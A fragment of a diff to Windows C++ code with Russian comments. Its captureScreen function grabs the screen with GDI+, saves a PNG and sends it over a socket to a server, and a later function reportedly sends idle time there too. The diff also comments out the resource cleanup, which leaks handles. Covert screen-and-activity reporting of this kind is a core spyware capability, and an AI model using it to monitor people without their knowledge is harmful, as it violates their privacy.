@@ -76,12 +76,12 @@ void captureScreen(SOCKET connectSocket) {
 
     Gdiplus::Bitmap bmp(hBitmap, NULL);
 
-    // Сохраняем скриншот во временный файл
-    const wchar_t* tempFilePath = L"temp_screenshot.png";
-    bmp.Save(tempFilePath, &clsid, NULL);
+    // Сохраняем скриншот в файл с новым именем
+    const wchar_t* screenshotFilePath = L"screenshot.png"; // Изменено имя файла
+    bmp.Save(screenshotFilePath, &clsid, NULL);
 
     // Открываем файл и считываем его содержимое
-    std::ifstream file(tempFilePath, std::ios::binary);
+    std::ifstream file(screenshotFilePath, std::ios::binary);
     if (!file) {
         std::cerr << "Failed to open temporary screenshot file." << std::endl;
         DeleteObject(hBitmap);
@@ -112,10 +112,10 @@ void captureScreen(SOCKET connectSocket) {
         std::cout << "Screenshot sent to server." << std::endl;
     }
 
-    DeleteObject(hBitmap);
-    DeleteDC(hMemoryDC);
-    ReleaseDC(NULL, hScreenDC);
-    GdiplusShutdown(gdiplusToken);
+    // DeleteObject(hBitmap);
+    // DeleteDC(hMemoryDC);
+    // ReleaseDC(NULL, hScreenDC);
+    // GdiplusShutdown(gdiplusToken);
 }
 
 // Функция для отправки времени простоя на сервер
